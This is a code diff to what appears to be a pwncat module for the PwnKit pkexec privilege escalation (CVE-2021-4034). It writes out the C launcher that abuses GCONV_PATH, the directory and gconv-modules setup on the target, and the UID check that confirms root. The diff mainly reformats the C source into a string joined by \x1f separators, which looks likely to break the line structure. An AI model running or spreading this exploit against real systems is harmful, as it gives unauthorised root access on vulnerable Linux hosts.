@@ -51,16 +51,9 @@ class Module(BaseModule):
         ).lstrip()
 
         pwnkitshell_source = textwrap.dedent(
-            f"""
-                #include <stdio.h>
-                #include <stdlib.h>
-                #include <unistd.h>
-                int main(int argc, char *argv[]) {{
-                    char *env[] = {{ "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL }};
-                    execve("/usr/bin/pkexec", (char*[]){{NULL}}, env);
-                }}
-            """
+            '\x1f                #include <stdio.h>\x1f                #include <stdlib.h>\x1f                #include <unistd.h>\x1f                int main(int argc, char *argv[]) {\x1f                    char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };\x1f                    execve("/usr/bin/pkexec", (char*[]){NULL}, env);\x1f                }\x1f            '
         ).lstrip()
+
 
         seed_dir = util.random_string(8)
 
@@ -76,7 +69,7 @@ class Module(BaseModule):
         scratch_path.mkdir()
         (scratch_path / 'GCONV_PATH=.').mkdir()
         (scratch_path / 'GCONV_PATH=./pwnkit').touch()
-        (scratch_path / 'GCONV_PATH=./pwnkit').chmod(0o755) 
+        (scratch_path / 'GCONV_PATH=./pwnkit').chmod(0o755)
         (scratch_path / "pwnkit").mkdir()
         (scratch_path / "pwnkit" / "gconv-modules").write_text( "module UTF-8// PWNKIT// pwnkit 2" )
 
@@ -85,7 +78,7 @@ class Module(BaseModule):
         pkexec = session.platform.which("pkexec")
         if pkexec is None:
             raise PlatformError("no pkexec found on target")
-        
+
         current_user = session.current_user()
         orig_id = current_user.id
 
@@ -129,14 +122,14 @@ class Module(BaseModule):
             session.log( "Failed privesc" )
             self.__cleanup(session, scratch_path)            
             raise ModuleFailed(f"privesc failed: {exc}") from exc
-        
+
         current_user = session.current_user()
         curr_id = current_user.id
 
         uid_status = f"UID : Before([blue]{orig_id}[/blue]) | After({curr_id})"
-        yield Status( f"{uid_status}") 
+        yield Status( f"{uid_status}")
         self.__cleanup(session, scratch_path)
-            
+
         session.log( f"ran {self.name}. {uid_status}")
 
     def __cleanup( self, session: "pwncat.manager.Session", scratch_path: "session.platform.Path" ):
